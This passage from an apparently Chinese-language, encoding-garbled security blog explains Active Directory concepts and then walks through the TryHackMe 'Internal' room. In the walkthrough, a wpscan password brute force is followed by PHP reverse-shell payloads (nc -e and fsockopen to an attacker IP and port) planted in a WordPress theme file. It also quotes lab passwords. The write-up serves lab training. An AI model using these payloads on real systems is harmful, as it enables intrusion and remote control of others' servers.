æ³•æ›´æ”¹ä»»ä½•ç®¡ç†ç»„æˆå‘˜èº«ä»½ã€‚</td></tr><tr><td>Backup Operators</td><td>æ­¤ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥è®¿é—®ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸å—å…¶æƒé™çš„é™åˆ¶ã€‚å®ƒä»¬ç”¨äºæ‰§è¡Œè®¡ç®—æœºä¸Šçš„æ•°æ®å¤‡ä»½ã€‚</td></tr><tr><td>Account Operators</td><td>è¯¥ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥åˆ›å»ºæˆ–ä¿®æ”¹åŸŸä¸­çš„å…¶ä»–å¸æˆ·ã€‚</td></tr><tr><td>Domain Users</td><td>åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç°æœ‰çš„ç”¨æˆ·å¸æˆ·ã€‚</td></tr><tr><td>Domain Computers</td><td>åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç°æœ‰çš„è®¡ç®—æœºã€‚</td></tr><tr><td>Domain Controllers</td><td>åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç°æœ‰çš„ DCã€‚</td></tr></tbody></table><p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</a>   å®˜æ–¹æ–‡æ¡£</p><p>OUç”¨äºå¯¹ç”¨æˆ·å’Œæœºå™¨è¿›è¡Œåˆ†ç±»ï¼ŒOUä¸‹å¯ä»¥æœ‰å¤šä¸ªå­OUï¼Œå¯ä»¥å°†OUç±»æ¯”æˆæ–‡ä»¶å¤¹ï¼Œè€Œç”¨æˆ·ç›¸å½“äºé‡Œé¢çš„æ–‡ä»¶ã€‚</p><h2 id="åœ¨-AD-ä¸­ç®¡ç†ç”¨æˆ·"><a href="#åœ¨-AD-ä¸­ç®¡ç†ç”¨æˆ·" class="headerlink" title="åœ¨ AD ä¸­ç®¡ç†ç”¨æˆ·"></a>åœ¨ AD ä¸­ç®¡ç†ç”¨æˆ·</h2><p>å§”æ‰˜ï¼šç°åœ¨å°†æŸä¸€OUçš„æƒé™è½¬ç§»ç»™å¦å¤–ä¸€ä¸ªOUä¸‹çš„ç”¨æˆ·ï¼Œè€Œæ— éœ€åŸŸç®¡ç†å‘˜çš„ä»‹å…¥ï¼Œç§°ä¸ºå§”æ‰˜ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202052794.png" alt="image-20241220205156513"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053346.png" alt="image-20241220205304223"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202053404.png" alt="image-20241220205341303"></p><p>ç„¶åé€‰æ‹©éœ€è¦å§”æ‰˜çš„æƒé™</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202055024.png" alt="image-20241220205544962"></p><p>ç„¶åphillipç”¨æˆ·å°±æœ‰ä¿®æ”¹å¯†ç çš„æƒé™äº†ï¼Œè¿™é‡Œçš„è¯å¦‚æœé€šè¿‡ <strong>Active Directory Users and Computers</strong> å»ä¿®æ”¹å¯†ç æ˜¯æ²¡æƒé™çš„ï¼Œå°±ç™»å½•ä¸äº†ï¼Œç„¶åå°±åˆ©ç”¨powershellè¿›è¡Œä¿®æ”¹å¯†ç </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ADAccountPassword</span> sophie <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">Read-Host</span> <span class="hljs-literal">-AsSecureString</span> <span class="hljs-literal">-Prompt</span> <span class="hljs-string">&#x27;New Password&#x27;</span>) <span class="hljs-literal">-Verbose</span> //æ›´æ”¹sophieç”¨æˆ·çš„å¯†ç <br><span class="hljs-built_in">Set-ADUser</span> <span class="hljs-literal">-ChangePasswordAtLogon</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Identity</span> sophie <span class="hljs-literal">-Verbose</span>  //ä½¿å¾—sophieç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ï¼Œå¼ºåˆ¶æ›´æ”¹å¯†ç <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202114130.png" alt="image-20241220211453018"></p><p>ä¸Šé¢å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†ï¼Œæ³¨æ„å¯†ç ä¸èƒ½è®¾ç½®å¤ªè¿‡ç®€å•ã€‚</p><h2 id="åœ¨-AD-ä¸­ç®¡ç†è®¡ç®—æœº"><a href="#åœ¨-AD-ä¸­ç®¡ç†è®¡ç®—æœº" class="headerlink" title="åœ¨ AD ä¸­ç®¡ç†è®¡ç®—æœº"></a>åœ¨ AD ä¸­ç®¡ç†è®¡ç®—æœº</h2><p>æ ¹æ®è®¾å¤‡çš„ç”¨é€”å¯¹å…¶è¿›è¡Œåˆ†ç±»ã€‚</p><p><strong>1.Workstations</strong></p><p>å·¥ä½œç«™æ˜¯ Active Directory åŸŸä¸­æœ€å¸¸è§çš„è®¾å¤‡ä¹‹ä¸€ã€‚åŸŸä¸­çš„æ¯ä¸ªç”¨æˆ·éƒ½å¯èƒ½ç™»å½•å·¥ä½œç«™ã€‚è¿™æ˜¯ä»–ä»¬ç”¨æ¥å·¥ä½œæˆ–è¿›è¡Œæ­£å¸¸æµè§ˆæ´»åŠ¨çš„è®¾å¤‡ã€‚è¿™äº›è®¾å¤‡ç»ä¸åº”è¯¥æœ‰ç‰¹æƒç”¨æˆ·ç™»å½•ã€‚</p><p><strong>2. Servers</strong></p><p>æœåŠ¡å™¨æ˜¯ Active Directory åŸŸä¸­ç¬¬äºŒå¸¸è§çš„è®¾å¤‡ã€‚æœåŠ¡å™¨é€šå¸¸ç”¨äºå‘ç”¨æˆ·æˆ–å…¶ä»–æœåŠ¡å™¨æä¾›æœåŠ¡ã€‚</p><p><strong>3. Domain Controllers</strong></p><p>åŸŸæ§åˆ¶å™¨æ˜¯ Active Directory åŸŸä¸­ç¬¬ä¸‰å¤§æœ€å¸¸è§çš„è®¾å¤‡ã€‚åŸŸæ§åˆ¶å™¨å…è®¸æ‚¨ç®¡ç† Active Directory åŸŸã€‚è¿™äº›è®¾å¤‡é€šå¸¸è¢«è§†ä¸ºç½‘ç»œä¸­æœ€æ•æ„Ÿçš„è®¾å¤‡ï¼Œå› ä¸ºå®ƒä»¬åŒ…å«ç¯å¢ƒä¸­æ‰€æœ‰ç”¨æˆ·å¸æˆ·çš„å“ˆå¸Œå¯†ç ã€‚</p><h2 id="ç»„ç­–ç•¥"><a href="#ç»„ç­–ç•¥" class="headerlink" title="ç»„ç­–ç•¥"></a>ç»„ç­–ç•¥</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202412202154578.png" alt="image-20241220215444288"></p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªGPOçš„åˆé›†ï¼Œé‡Œé¢ç›¸å½“äºæ˜¯ä¸€äº›åˆ¶å®šçš„è§„åˆ™ ç„¶åå†åº”ç”¨åˆ°ä¸åŒçš„OUä¸­ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚åŒæ—¶ï¼Œä¸€ä¸ªGPOå½±å“ é“¾æ¥åˆ°çš„OUåŠå…¶å­OUã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222106690.png" alt="image-20250122210629502"></p><p>ä¸Šé¢æ˜¯GPOçš„ä¸€äº›è®¾ç½®ä¿¡æ¯ï¼Œé‡Œé¢åŒ…å«ä¸åŒçš„ç­–ç•¥ã€‚</p><h3 id="GPOåˆ†å‘"><a href="#GPOåˆ†å‘" class="headerlink" title="GPOåˆ†å‘"></a>GPOåˆ†å‘</h3><p>GPO é€šè¿‡åä¸º <code>SYSVOL</code> çš„ç½‘ç»œå…±äº«åˆ†å‘åˆ°ç½‘ç»œï¼Œè¯¥å…±äº«å­˜å‚¨åœ¨ DC ä¸­ã€‚åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·é€šå¸¸éƒ½åº”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®æ­¤å…±äº«ï¼Œä»¥å®šæœŸåŒæ­¥å…¶ GPOã€‚SYSVOL å…±äº«é»˜è®¤æŒ‡å‘<code>C:\Windows\SYSVOL\sysvol\</code>.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">gpupdate <span class="hljs-string">/force</span>  <span class="hljs-string">//</span>åŠæ—¶åŒæ­¥GPOä¿¡æ¯<br></code></pre></td></tr></table></figure><h2 id="èº«ä»½éªŒè¯æ–¹æ³•"><a href="#èº«ä»½éªŒè¯æ–¹æ³•" class="headerlink" title="èº«ä»½éªŒè¯æ–¹æ³•"></a>èº«ä»½éªŒè¯æ–¹æ³•</h2><p>ä½¿ç”¨ Windows åŸŸæ—¶ï¼Œæ‰€æœ‰å‡­æ®éƒ½å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸­ã€‚æ¯å½“ç”¨æˆ·å°è¯•ä½¿ç”¨åŸŸå‡­æ®å‘æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œè¯¥æœåŠ¡éƒ½éœ€è¦è¯·æ±‚åŸŸæ§åˆ¶å™¨éªŒè¯å®ƒä»¬æ˜¯å¦æ­£ç¡®ã€‚Windows åŸŸä¸­çš„ç½‘ç»œèº«ä»½éªŒè¯å¯ä»¥ä½¿ç”¨ä¸¤ç§åè®®ï¼š</p><ul><li><strong>Kerberosï¼š</strong>ä»»ä½•è¾ƒæ–°ç‰ˆæœ¬çš„ Windows å‡ä½¿ç”¨ Kerberosã€‚è¿™æ˜¯ä»»ä½•è¾ƒæ–°åŸŸä¸­çš„é»˜è®¤åè®®ã€‚</li><li><strong>NetNTLMï¼š</strong>ä¸ºäº†å…¼å®¹æ€§ç›®çš„è€Œä¿ç•™çš„æ—§å¼èº«ä»½éªŒè¯åè®®ã€‚</li></ul><h3 id="Kerberosèº«ä»½éªŒè¯"><a href="#Kerberosèº«ä»½éªŒè¯" class="headerlink" title="Kerberosèº«ä»½éªŒè¯"></a>Kerberosèº«ä»½éªŒè¯</h3><p>Kerberosèº«ä»½éªŒè¯æ˜¯ Windows æœ€æ–°ç‰ˆæœ¬çš„é»˜è®¤èº«ä»½éªŒè¯åè®®ã€‚ä½¿ç”¨Kerberosç™»å½•æœåŠ¡çš„ç”¨æˆ·å°†è¢«åˆ†é…ç¥¨è¯ã€‚å°†ç¥¨è¯è§†ä¸ºå…ˆå‰èº«ä»½éªŒè¯çš„è¯æ˜ã€‚æ‹¥æœ‰ç¥¨è¯çš„ç”¨æˆ·å¯ä»¥å°†å…¶å‡ºç¤ºç»™æœåŠ¡ï¼Œä»¥è¯æ˜ä»–ä»¬ä¹‹å‰å·²é€šè¿‡ç½‘ç»œèº«ä»½éªŒè¯ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥æœåŠ¡ã€‚</p><p>å½“ä½¿ç”¨Kerberosè¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹è¿‡ç¨‹ï¼š</p><ol><li><p>ç”¨æˆ·å°†å…¶ç”¨æˆ·åå’Œä½¿ç”¨ä»å…¶å¯†ç æ´¾ç”Ÿçš„å¯†é’¥åŠ å¯†çš„æ—¶é—´æˆ³å‘é€åˆ°**å¯†é’¥åˆ†å‘ä¸­å¿ƒ (KDC)**ï¼Œè¯¥æœåŠ¡é€šå¸¸å®‰è£…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œè´Ÿè´£åœ¨ç½‘ç»œä¸Šåˆ›å»ºKerberosç¥¨è¯ã€‚</p><p>KDC å°†åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ª<strong>ç¥¨è¯æˆäºˆç¥¨è¯ ( TGT )<strong>ï¼Œè¿™å°†å…è®¸ç”¨æˆ·è¯·æ±‚æ›´å¤šç¥¨è¯ä»¥è®¿é—®ç‰¹å®šæœåŠ¡ã€‚éœ€è¦ç¥¨è¯æ‰èƒ½è·å¾—æ›´å¤šç¥¨è¯å¬èµ·æ¥å¯èƒ½æœ‰ç‚¹å¥‡æ€ªï¼Œä½†å®ƒå…è®¸ç”¨æˆ·åœ¨æ¯æ¬¡æƒ³è¦è¿æ¥åˆ°æœåŠ¡æ—¶è¯·æ±‚æœåŠ¡ç¥¨è¯è€Œæ— éœ€ä¼ é€’å…¶å‡­æ®ã€‚é™¤äº† TGT ä¹‹å¤–ï¼Œè¿˜ä¼šå‘ç”¨æˆ·æä¾›</strong>ä¼šè¯å¯†é’¥</strong>ï¼Œä»–ä»¬å°†éœ€è¦è¯¥å¯†é’¥æ¥ç”Ÿæˆä»¥ä¸‹è¯·æ±‚ã€‚</p><p>è¯·æ³¨æ„ï¼ŒTGTæ˜¯ä½¿ç”¨<strong>krbtgt</strong>å¸æˆ·çš„å¯†ç å“ˆå¸ŒåŠ å¯†çš„ï¼Œå› æ­¤ç”¨æˆ·æ— æ³•è®¿é—®å…¶å†…å®¹ã€‚å¿…é¡»çŸ¥é“ï¼ŒåŠ å¯†çš„TGTåŒ…å«ä¼šè¯å¯†é’¥çš„å‰¯æœ¬ä½œä¸ºå…¶å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸” KDC æ— éœ€å­˜å‚¨ä¼šè¯å¯†é’¥ï¼Œå› ä¸ºå®ƒå¯ä»¥é€šè¿‡è§£å¯†TGTæ¥æ¢å¤å‰¯æœ¬ï¼ˆå¦‚æœéœ€è¦ï¼‰ã€‚</p></li><li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png" alt="Kerberos æ­¥éª¤ 1"></p></li><li><p>å½“ç”¨æˆ·æƒ³è¦è¿æ¥åˆ°ç½‘ç»œä¸Šçš„æœåŠ¡ï¼ˆå¦‚å…±äº«ã€ç½‘ç«™æˆ–æ•°æ®åº“ï¼‰æ—¶ï¼Œä»–ä»¬å°†ä½¿ç”¨å…¶TGTå‘ KDC è¯·æ±‚<strong>ç¥¨è¯æˆäºˆæœåŠ¡ (TGS)<strong>ã€‚TGS æ˜¯ä»…å…è®¸è¿æ¥åˆ°ä¸ºå…¶åˆ›å»ºçš„ç‰¹å®šæœåŠ¡çš„ç¥¨è¯ã€‚è¦è¯·æ±‚ TGSï¼Œç”¨æˆ·å°†å‘é€ä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†çš„ç”¨æˆ·åå’Œæ—¶é—´æˆ³ï¼Œä»¥åŠ TGTå’ŒæœåŠ¡</strong>ä¸»ä½“åç§° (SPN)ï¼Œ</strong>åè€…æŒ‡ç¤ºæˆ‘ä»¬æ‰“ç®—è®¿é—®çš„æœåŠ¡å’ŒæœåŠ¡å™¨åç§°ã€‚</p><p>å› æ­¤ï¼ŒKDC å°†å‘æˆ‘ä»¬å‘é€ TGS ä»¥åŠ<strong>æœåŠ¡ä¼šè¯å¯†é’¥</strong>ï¼Œæˆ‘ä»¬éœ€è¦è¯¥å¯†é’¥æ¥éªŒè¯æˆ‘ä»¬è¦è®¿é—®çš„æœåŠ¡ã€‚TGS ä½¿ç”¨ä» <strong>æœåŠ¡æ‰€æœ‰è€…å“ˆå¸Œ</strong>æ´¾ç”Ÿçš„å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚æœåŠ¡æ‰€æœ‰è€…æ˜¯æœåŠ¡åœ¨å…¶ä¸‹è¿è¡Œçš„ç”¨æˆ·æˆ–æœºå™¨å¸æˆ·ã€‚TGS åœ¨å…¶åŠ å¯†å†…å®¹ä¸­åŒ…å«æœåŠ¡ä¼šè¯å¯†é’¥çš„å‰¯æœ¬ï¼Œä»¥ä¾¿æœåŠ¡æ‰€æœ‰è€…å¯ä»¥é€šè¿‡è§£å¯† TGS æ¥è®¿é—®å®ƒã€‚</p></li><li><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png" alt="Kerberos æ­¥éª¤ 2"></p></li><li><p>ç„¶åï¼ŒTGS å¯ä»¥å‘é€åˆ°æ‰€éœ€çš„æœåŠ¡ä»¥è¿›è¡Œèº«ä»½éªŒè¯å¹¶å»ºç«‹è¿æ¥ã€‚è¯¥æœåŠ¡å°†ä½¿ç”¨å…¶é…ç½®çš„å¸æˆ·çš„å¯†ç å“ˆå¸Œæ¥è§£å¯† TGS å¹¶éªŒè¯æœåŠ¡ä¼šè¯å¯†é’¥ã€‚</p></li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png" alt="Kerberos æ­¥éª¤ 3"></p><h3 id="NetNTLM-èº«ä»½éªŒè¯"><a href="#NetNTLM-èº«ä»½éªŒè¯" class="headerlink" title="NetNTLM èº«ä»½éªŒè¯"></a>NetNTLM èº«ä»½éªŒè¯</h3><p>NetNTLM é‡‡ç”¨è´¨è¯¢-å“åº”æœºåˆ¶ã€‚ æ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png" alt="NetNTLM èº«ä»½éªŒè¯"></p><ol><li>å®¢æˆ·ç«¯å‘å…¶æƒ³è¦è®¿é—®çš„æœåŠ¡å™¨å‘é€èº«ä»½éªŒè¯è¯·æ±‚ã€‚</li><li>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºæ•°å¹¶å°†å…¶ä½œä¸ºæŒ‘æˆ˜å‘é€ç»™å®¢æˆ·ç«¯ã€‚</li><li>å®¢æˆ·ç«¯å°†å…¶NTLMå¯†ç å“ˆå¸Œä¸è´¨è¯¢ï¼ˆå’Œå…¶ä»–å·²çŸ¥æ•°æ®ï¼‰ç›¸ç»“åˆï¼Œä»¥ç”Ÿæˆå¯¹è´¨è¯¢çš„å“åº”å¹¶å°†å…¶å‘é€å›æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚</li><li>æœåŠ¡å™¨å°†è´¨è¯¢å’Œå“åº”è½¬å‘ç»™åŸŸæ§åˆ¶å™¨è¿›è¡ŒéªŒè¯ã€‚</li><li>åŸŸæ§åˆ¶å™¨ä½¿ç”¨è¯¥è´¨è¯¢é‡æ–°è®¡ç®—å“åº”ï¼Œå¹¶å°†å…¶ä¸å®¢æˆ·ç«¯å‘é€çš„åŸå§‹å“åº”è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœä¸¤è€…åŒ¹é…ï¼Œåˆ™å®¢æˆ·ç«¯é€šè¿‡èº«ä»½éªŒè¯ï¼› å¦åˆ™ï¼Œè®¿é—®è¢«æ‹’ç»ã€‚ èº«ä»½éªŒè¯ç»“æœå°†å‘é€å›æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨å°†è®¤è¯ç»“æœè½¬å‘ç»™å®¢æˆ·ç«¯ã€‚</li></ol><h2 id="æ ‘æœ¨ã€æ£®æ—å’Œä¿¡æ‰˜"><a href="#æ ‘æœ¨ã€æ£®æ—å’Œä¿¡æ‰˜" class="headerlink" title="æ ‘æœ¨ã€æ£®æ—å’Œä¿¡æ‰˜"></a>æ ‘æœ¨ã€æ£®æ—å’Œä¿¡æ‰˜</h2><h3 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h3><p>å‡è®¾ä¸€å®¶å…¬å¸ä¸‹é¢ï¼Œæœ‰ä¸¤ä¸ªåˆ†å…¬å¸ï¼Œè¿™æ ·ç›¸äº’ç»„æˆäº†ä¸€ä¸ªæ ‘ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222212111.png" alt="image-20250122221228894"></p><h3 id="æ£®æ—"><a href="#æ£®æ—" class="headerlink" title="æ£®æ—"></a>æ£®æ—</h3><p>å‡è®¾ä¸€å®¶å…¬å¸ä¸ä»…å†æœ¬å›½æœ‰å…¬å¸ï¼Œåœ¨å…¶ä»–å›½å®¶ä¹Ÿæœ‰å…¬å¸ï¼Œè¿™æ ·ç»„åˆåœ¨ä¸€èµ·å°±æ„æˆäº†ä¸€ä¸ªæ£®æ—ã€‚</p><p>å…·ä½“çš„è¯å°±æ˜¯å°†å…·æœ‰ä¸åŒå‘½åç©ºé—´çš„æ ‘ç»„åˆåˆ°ä¸€ä¸ªç½‘ç»œä¸­ï¼Œå°±æ„æˆäº†æ£®æ—ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222213100.png" alt="image-20250122221350953"></p><h3 id="ä¿¡æ‰˜"><a href="#ä¿¡æ‰˜" class="headerlink" title="ä¿¡æ‰˜"></a>ä¿¡æ‰˜</h3><p>å½“ä¸€ä¸ªæ ‘ä¸­çš„æŸä¸ªç”¨æˆ·ï¼Œéœ€è¦è®¿é—®å¦å¤–ä¸€ä¸ªæ ‘ä¸­çš„ç”¨æˆ·æ—¶ï¼Œè¿™å°±éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼Œåˆ†ä¸ºå•å‘ä¿¡ä»»å’ŒåŒå‘ä¿¡ä»»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501222216218.png" alt="image-20250122221634085"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Internal</title>
    <link href="/2024/11/28/Internal/"/>
    <url>/2024/11/28/Internal/</url>
    
    <content type="html"><![CDATA[<h1 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h1><h2 id="ä¿¡æ¯æ”¶é›†ï¼š"><a href="#ä¿¡æ¯æ”¶é›†ï¼š" class="headerlink" title="ä¿¡æ¯æ”¶é›†ï¼š"></a>ä¿¡æ¯æ”¶é›†ï¼š</h2><p>nmapæ‰«ä¸€æ³¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png" alt="image-20241128232225305"></p><p>22å’Œ80ç«¯å£å¼€æ”¾</p><p>æ‰«ä¸‹åå°</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png" alt="image-20241128230205435"></p><p>æœ‰ä¸€ä¸ªphpadminå’Œwordpressçš„åå°ç™»å½•</p><p>ä½¿ç”¨wpscnæ‰«ä¸€ä¸‹çœ‹çœ‹æƒ…å†µ</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wpscan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -<span class="hljs-string">eu</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png" alt="image-20241128235936207"></p><p>åˆ©ç”¨wpscançˆ†ç ´å¯†ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -U admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png" alt="image-20241129001527658"></p><p>å¾—åˆ°å¯†ç  my2boys</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png" alt="image-20241129220505885"></p><p>è¿™ä¸ªåœ°æ–¹å¯ä»¥æ·»åŠ phpä»£ç  ç„¶åå…·ä½“è·¯å¾„çš„è¯ å¯ä»¥å»ç½‘ä¸Šæ‰¾åˆ°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nternal.thm<span class="hljs-regexp">/blog/</span>wp-content<span class="hljs-regexp">/themes/</span>twentyseventeen<span class="hljs-regexp">/404.php/</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png" alt="image-20241129220611076"></p><p>æ·»åŠ ä¸€ä¸ªåå¼¹shellçš„å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc -e /bin/bash ä¸»æœºIP ä¸»æœºç«¯å£&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;10.14.74.6&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>);<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå¯ä»¥è¿ä¸Š ç„¶åæä¸€ä¸ªpythonçš„ äº¤äº’shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>å‘ç°ç°åœ¨åªæ˜¯ww-dataç”¨æˆ· çœ‹ä¸€ä¸‹æ•°æ®åº“æ˜¯å¦æœ‰å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png" alt="image-20241129222147415"></p><p>è¿æ¥ä¸Šå»çœ‹çœ‹æƒ…å†µ</p><p>é‡Œé¢å°±æœ‰ä¸€ä¸ªadminç”¨æˆ· å¹¶æ²¡æœ‰ æˆ‘ä»¬æƒ³è¦çš„aubreannaç”¨æˆ·çš„å¯†ç  æŸ¥çœ‹/etc/shadowçš„å†…å®¹æç¤ºæ²¡æƒé™</p><p>è¿™é‡Œçœ‹äº†ä¸€ä¸‹wpæ˜¯åœ¨optç›®å½•ä¸‹å‘ç°çš„ä¿¡æ¯(ä»¥åè¿˜å¾—ä»”ç»†åœ°ç¿»çœ‹æ¯ä¸ªç›®å½•ä¸‹çš„å…³é”®ä¿¡æ¯)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png" alt="image-20241129224826818"></p><p>å¾—åˆ°å¯†ç ä¹‹åsshç™»å½•ä¸Šå»å³å¯ bubb13guM!@#123</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨ jenkins.txt ä¸­å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€å±‚å†…ç½‘çš„æœåŠ¡ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png" alt="image-20241129230924923"></p><p>åˆ©ç”¨sshå°†è¿™ä¸ªipä¸Šçš„æœåŠ¡è½¬ç§»åˆ°æœ¬åœ°çš„8081ç«¯å£ä¸Š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8081</span>:<span 